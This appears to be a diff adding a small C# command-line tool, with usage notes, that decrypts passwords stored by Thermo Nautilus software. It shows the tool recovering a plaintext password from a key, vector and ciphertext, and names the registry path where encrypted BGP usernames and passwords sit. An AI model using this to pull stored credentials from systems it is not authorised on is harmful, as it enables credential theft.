@@ -63,3 +63,33 @@ namespace DecryptNautilusPasswords
     class Program
     {
         static void Main(string[] args)
+        {
+            try 
+            {
+                if (args.Length < 3) throw new ArgumentException();
+                
+                var decrypted = string.Empty;
+                var sym = new SymmCrypto();
+                sym.Decrypt(args[0], args[1], args[2], out decrypted);
+                Console.WriteLine(decrypted);
+            }
+            catch (Exception) 
+            {
+                Console.WriteLine("Failed to decrypt.  Try again, passing args in this order: 1.Key 2.Vector 3.EncryptedPassword");
+            }
+        }
+    }
+}
+
+```
+
+And here is how the example compiled executable would work:
+
+```shell
+> ExecutableName.exe Nautilus Secret H7y5bAD1IidlB1YqxVyusw==
+secret123
+```
+
+The output is the decrypted password. (In this case, "secret123")
+
+This same process works for encrypted values in the registry (BGP username, password at `HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Thermo\Nautilus\9.3\BGP#servername#instancename#x\ParameterX`).
